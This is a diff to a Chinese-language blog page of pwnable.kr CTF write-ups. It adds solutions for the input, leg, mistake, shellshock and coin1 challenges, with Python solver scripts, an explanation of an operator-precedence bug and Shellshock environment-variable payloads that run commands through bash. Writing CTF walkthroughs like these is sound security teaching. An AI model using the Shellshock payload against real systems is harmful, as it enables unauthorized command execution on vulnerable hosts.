@@ -110,7 +110,15 @@
 <meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5808046-d024dbdbc982d5e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5808046-699a21021372b1fe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5808046-b1ff43d999429ea9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2018-11-16T16:52:02.265Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-47662bae13f43d74.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-8fffbf0dc85a6c95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-5c159ec55ac80a4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-0aa8e962c8d9b91a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-60e50b029b117e18.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-c1a9fb7b9ccd3921.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-4620665a4b677b9a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-ba52432c9bd0e904.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-04T02:43:51.715Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[pwnable.kr] writeups">
 <meta name="twitter:description" content="fd由于刚入手pwn，所以想着做些基础的题来提升自己，为了以后方便回顾首先来看源码 #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){     if(argc&amp;lt;2){">
@@ -394,7 +402,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.7k
+                  2.7k
                 </span>
               
 
@@ -410,7 +418,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  7
+                  12
                 </span>
               
             </div>
@@ -660,7 +668,69 @@ int main(){
 <p><img src="http://upload-images.jianshu.io/upload_images/5808046-699a21021372b1fe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
 <p>得到key了<br>最后获取flag</p>
 <p><img src="http://upload-images.jianshu.io/upload_images/5808046-b1ff43d999429ea9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<h1 id="input"><a href="#input" class="headerlink" title="input"></a>input</h1>
+<h1 id="input"><a href="#input" class="headerlink" title="input"></a>input</h1><ul>
+<li>需要对linux操作有一定的认识，前面的绕过ida或者看源码都能推出来，最后由于我们在input2目录下没有写文件的权限，而tmp目录下只有写权限而没有读权限，所以我们在tmp目录下新建一个input2目录来存放我们的脚本，并用软连接命令来在当前目录创建一个flag副本才能读取到flag</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /home/input2/flag flag</span><br></pre></td></tr></table></figure>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line"></span><br><span class="line">import subprocess</span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">payload = []</span><br><span class="line">payload.append(&apos;/home/input2/input&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(64):</span><br><span class="line">	payload.append(&apos;a&apos;)</span><br><span class="line"></span><br><span class="line">payload.append(&apos;&apos;)</span><br><span class="line">payload.append(&apos; \n\r&apos;)</span><br><span class="line">payload.append(&apos;4567&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(32):</span><br><span class="line">	payload.append(&apos;a&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stdinr, stdinw = os.pipe()</span><br><span class="line">stderrr, stderrw = os.pipe()</span><br><span class="line"></span><br><span class="line">os.write(stdinw,&apos;\x00\x0a\x00\xff&apos;)</span><br><span class="line">os.write(stderrw,&apos;\x00\x0a\x02\xff&apos;)</span><br><span class="line">environ = &#123;&apos;\xde\xad\xbe\xef&apos; : &apos;\xca\xfe\xba\xbe&apos; &#125;</span><br><span class="line"></span><br><span class="line">f = open(&apos;\n&apos;,&apos;wb&apos;)</span><br><span class="line">f.write(&apos;\x00&apos;*4)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print subprocess.Popen(payload,stdin = stdinr , stderr = stderrr , env = environ)</span><br><span class="line"></span><br><span class="line">time.sleep(2)</span><br><span class="line">s.connect((&apos;127.0.0.1&apos;,4567))</span><br><span class="line"></span><br><span class="line">s.send(&apos;\xde\xad\xbe\xef&apos;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-47662bae13f43d74.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>参考文章：</p>
+<ul>
+<li><a href="https://www.jianshu.com/p/032a754b72d8" target="_blank" rel="noopener">https://www.jianshu.com/p/032a754b72d8</a></li>
+</ul>
+<h1 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h1><ul>
+<li>key1()函数获取pc寄存器的值，key2()函数获取pc寄存器 + 4的值，key3()函数获得lr寄存器的值，arm的pc寄存器永远指向当前执行的指令后的第二条指令，而lr寄存器在执行函数调用的时候取pc-4的值来保留返回地址。所以这里是</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-8fffbf0dc85a6c95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0x00008ce4 + 0x00008d08+4 + 0x00008d80</span><br><span class="line">108400</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-5c159ec55ac80a4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h1 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h1><ul>
+<li>从ida反编译结果来看，有两次输入，只要第一次的输入字符每一位异或1后与第二次输入的字符相等就会cat flag ，有点没明白考点是撒</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-0aa8e962c8d9b91a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-60e50b029b117e18.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>事后看了师傅的wp才知道原来是源码出现了错误</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">#define PW_LEN 10</span><br><span class="line">#define XORKEY 1</span><br><span class="line"></span><br><span class="line">void xor(char* s, int len)&#123;</span><br><span class="line">	int i;</span><br><span class="line">	for(i=0; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^= XORKEY;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	</span><br><span class="line">	int fd;</span><br><span class="line">	if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123;</span><br><span class="line">		printf(&quot;can&apos;t open password %d\n&quot;, fd);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;do not bruteforce...\n&quot;);</span><br><span class="line">	sleep(time(0)%20);</span><br><span class="line"></span><br><span class="line">	char pw_buf[PW_LEN+1];</span><br><span class="line">	int len;</span><br><span class="line">	if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;</span><br><span class="line">		printf(&quot;read error\n&quot;);</span><br><span class="line">		close(fd);</span><br><span class="line">		return 0;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	char pw_buf2[PW_LEN+1];</span><br><span class="line">	printf(&quot;input password : &quot;);</span><br><span class="line">	scanf(&quot;%10s&quot;, pw_buf2);</span><br><span class="line"></span><br><span class="line">	// xor your input</span><br><span class="line">	xor(pw_buf2, 10);</span><br><span class="line"></span><br><span class="line">	if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">		printf(&quot;Password OK\n&quot;);</span><br><span class="line">		system(&quot;/bin/cat flag\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;Wrong Password\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>由于fd=open()外没有括号，而<strong><em>&lt;</em></strong>的优先级高于<strong><em>=</em></strong> ，于是先执行open()函数，再和0比较大小，最后赋值给fd。</p>
+</li>
+<li><p>当open成功时返回一个正数，这里的判断逻辑就变成了正数 &lt; 0，返回false，也就是0。所以最后赋给 fd 的值为0，也就变成了stdin，所以就造成了ida反编译看有两次输入机会</p>
+</li>
+<li><p>参考文章：</p>
+</li>
+<li><p><a href="https://blog.csdn.net/qq_19550513/article/details/62045323" target="_blank" rel="noopener">https://blog.csdn.net/qq_19550513/article/details/62045323</a></p>
+</li>
+</ul>
+<h1 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h1><ul>
+<li>这题考验对linux的权限认知，首先shellshock程序有特殊sgid权限，当执行shellshock时，当前的权限就会上升到shellshock_pwn，就会有查看flag的权限了，然后利用<a href="">shellshock(破壳)漏洞</a>来任意bash命令执行cat flag</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-c1a9fb7b9ccd3921.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>测试有无破壳漏洞</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=&apos;() &#123; :;&#125;; echo vulnerable&apos; ./bash -c &quot;test&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>cat flag</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=&apos;() &#123; :;&#125;; /bin/cat flag&apos; ./shellshock</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-4620665a4b677b9a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li><p>参考文章：</p>
+</li>
+<li><p><a href="http://www.cnblogs.com/snake-hand/p/3161511.html" target="_blank" rel="noopener">http://www.cnblogs.com/snake-hand/p/3161511.html</a></p>
+</li>
+<li><a href="https://blog.csdn.net/qq_19550513/article/details/62425692" target="_blank" rel="noopener">https://blog.csdn.net/qq_19550513/article/details/62425692</a></li>
+<li><a href="https://www.cnblogs.com/limingluzhu/p/5702486.html" target="_blank" rel="noopener">https://www.cnblogs.com/limingluzhu/p/5702486.html</a></li>
+</ul>
+<h1 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h1><ul>
+<li>一道考验二分法的编程题，直接写脚本但是连接太慢了，所以ssh连上以前的服务器上跑</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p = remote(&apos;pwnable.kr&apos;, 9007)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;- Ready? starting in 3 sec... -&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def senddata(num_start,num_end,C,count,coin = 0):</span><br><span class="line"></span><br><span class="line">	#print &apos;num_start: %d , num_end: %d&apos;%(num_start,num_end)</span><br><span class="line">	#print &apos;C: %d,count: %d&apos;%(C,count)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	if count == C:</span><br><span class="line">		p.sendline(str(coin))</span><br><span class="line">		return </span><br><span class="line"></span><br><span class="line">	a = &apos;&apos;</span><br><span class="line">	for i in range(num_start,(num_end+num_start)/2+1):</span><br><span class="line">		a += str(i) + &apos; &apos;</span><br><span class="line"></span><br><span class="line">	p.sendline(a)</span><br><span class="line"></span><br><span class="line">	data = p.recvuntil(&apos;\n&apos;,drop=True)</span><br><span class="line"></span><br><span class="line">	if data[-1] != &apos;9&apos;:</span><br><span class="line">		senddata((num_end+num_start)/2+1,num_end,C,count+1,num_end)</span><br><span class="line">	else:</span><br><span class="line">		if num_end - num_start == 1:</span><br><span class="line">			coin = num_start</span><br><span class="line">		senddata(num_start,(num_end+num_start)/2,C,count+1,coin)</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">	i += 1</span><br><span class="line">	print i</span><br><span class="line">	p.recvuntil(&apos;N=&apos;)</span><br><span class="line">	N = int(p.recvuntil(&apos; &apos;,drop = True))</span><br><span class="line">	p.recvuntil(&apos;C=&apos;)</span><br><span class="line">	C = int(p.recvuntil(&apos;\n&apos;,drop = True))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	senddata(0,N,C,0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-ba52432c9bd0e904.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+
       
     </div>
     
@@ -885,7 +955,7 @@ int main(){
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#fd"><span class="nav-number">1.</span> <span class="nav-text">fd</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#collision"><span class="nav-number">2.</span> <span class="nav-text">collision</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bof"><span class="nav-number">3.</span> <span class="nav-text">bof</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag"><span class="nav-number">4.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#passcode"><span class="nav-number">5.</span> <span class="nav-text">passcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#random"><span class="nav-number">6.</span> <span class="nav-text">random</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#input"><span class="nav-number">7.</span> <span class="nav-text">input</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#fd"><span class="nav-number">1.</span> <span class="nav-text">fd</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#collision"><span class="nav-number">2.</span> <span class="nav-text">collision</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bof"><span class="nav-number">3.</span> <span class="nav-text">bof</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag"><span class="nav-number">4.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#passcode"><span class="nav-number">5.</span> <span class="nav-text">passcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#random"><span class="nav-number">6.</span> <span class="nav-text">random</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#input"><span class="nav-number">7.</span> <span class="nav-text">input</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#leg"><span class="nav-number">8.</span> <span class="nav-text">leg</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mistake"><span class="nav-number">9.</span> <span class="nav-text">mistake</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellshock"><span class="nav-number">10.</span> <span class="nav-text">shellshock</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#coin1"><span class="nav-number">11.</span> <span class="nav-text">coin1</span></a></li></ol></div>
             
 
           </div>
@@ -943,7 +1013,7 @@ int main(){
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共42.5k字</span>
+  <span class="post-count">博客全站共43.5k字</span>
 </div>
 
         
